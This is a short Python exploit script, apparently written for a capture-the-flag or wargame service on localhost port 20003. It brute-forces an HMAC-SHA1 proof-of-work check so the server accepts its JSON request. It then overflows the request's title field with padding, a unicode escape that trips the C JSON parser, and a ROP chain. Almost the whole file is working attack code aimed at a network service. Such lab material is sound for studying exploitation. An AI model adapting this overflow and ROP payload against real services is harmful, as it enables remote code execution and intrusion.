#!/usr/bin/python
#-*- encoding: utf-8 -*-
import socket
import struct
from time import sleep
from rop import *
import json
import time
from Crypto.Hash import SHA
from Crypto.Hash import HMAC
import random

HOST = '127.0.0.1'
PORT = 20003

def break_hashcash(token, payload):
    found = False
    i = 0
    jdict = {"tags": ["first_tag", "second_tag"],
             "title": payload,
             "contents": "contenido",
             "serverip": "127.0.0.1:12345",
             "hashcash": 0
            }
    start = time.time()
    while not found:
        rand = random.random()
        jdict["hashcash"] = str(rand)
        # after reading the code, tags must be a list. If not, json lib crashes
        jdata = json.dumps(jdict, ensure_ascii=False)
        # the C json library seems to process <number>\n<json_object>
        indata = token + '\n' + jdata
        # this breaks the program in handle_request function
        h = HMAC.new(token, indata, SHA)
        res = h.digest()
        if (ord(res[0]) | ord(res[1])) == 0:
            found = True
            print('[+] Proof of work: {}'.format(res.encode('hex')))
        i += 1

    end = time.time()
    print('[+] Number of tries: {0}, elapsed time: {1}'.format(i, end-start))
    return indata

def exploit(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    token = s.recv(65)
    token = token[1:-2]
    print('[+] Received token: {0}'.format(token))
    data = break_hashcash(token, payload)
    s.send(data)
    s.shutdown(socket.SHUT_RD)

def build_payload():
    payload = 'A' * 127 + '\u1212' + 'A' * 31
    payload += create_rop()
    print('[+] ROP payload size: {0} bytes'.format(len(payload) - 164))
    return payload

payload = build_payload()
exploit(payload)


